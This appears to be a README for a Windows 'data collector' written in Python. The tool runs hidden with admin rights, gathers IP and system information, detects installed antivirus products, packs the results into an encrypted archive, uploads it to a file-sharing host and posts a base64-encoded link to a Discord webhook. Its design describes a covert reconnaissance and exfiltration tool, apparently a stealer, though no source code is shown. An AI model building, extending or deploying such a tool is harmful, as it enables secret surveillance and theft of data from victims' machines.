# Data Collector

A Python-based system information collection tool that gathers various data about the system including IP information, system details, and installed antivirus software.

## Features

- **IP Data Collection**: Scrapes detailed IP information from ipdata.co using Playwright
- **System Information**: Exports system information using Windows MSInfo32
- **Antivirus Detection**: Scans for installed antivirus software on the system
- **Automated Data Collection**: All data collection processes run automatically in parallel
- **Secure Storage**: Collected data is stored in encrypted 7z archive

## Components

### 1. IP Data Collector (`utils/ipdata.py`)
- Scrapes IP information from ipdata.co
- Handles automated Playwright installation and configuration
- Saves results in JSON format
- Includes detailed logging

### 2. System Information Collector (`utils/msinfo.py`)
- Exports system information using msinfo32
- Runs without GUI intervention
- Saves detailed system information in NFO format
- Includes progress logging

### 3. Antivirus Scanner (`utils/antivirus.py`)
- Scans for installed antivirus software
- Detects major antivirus products
- Uses pattern matching for executable detection
- Generates detailed scan reports

### 4. Main Launcher (`launch.pyw`)
- Coordinates all collection processes
- Runs with administrative privileges
- Implements threading for parallel execution
- Secures collected data in encrypted archives

## Requirements

- Windows Operating System
- Python 
- Required Python packages:
  - playwright
  - py7zr
  - ctypes

## Installation

1. Clone the repository
2. Install required Python packages:
```bash
pip install playwright py7zr
```
3. Install Playwright browsers:
```bash
python -m playwright install chromium
```

## Usage

Run the launcher script:
```bash
pythonw launch.pyw
```

The script will:
1. Request administrative privileges
2. Launch all data collection processes in parallel
3. Store results in the temporary directory
4. Create an encrypted archive of all collected data

## Output Location

All collected data is stored in:
```
%TEMP%\lunix\
```

The final encrypted archive will be created in the temp directory with the naming format:
```
%TEMP%\username_HH_MM_SS.7z
```

By default, the 7z archive password is set to be the same as the archive filename (e.g., if the file is named `lunix_14_30_45.7z`, the password should be `lunix_14_30_45.7z`). This can be modified in the `launch.pyw` script by changing the password parameter in the `py7zr.SevenZipFile` call.

Then the archive file will be posted on "https://send.vis.ee" after that it will send the base64 encoded url to discord webhook

## TODO

### Retrieval Client
  - Develop automated retrieval system
  - Create auto message decryption functionality
  - Implement automatic URL extraction
  - Add file download for handed url

## License

See the [LICENSE](LICENSE) file for details.
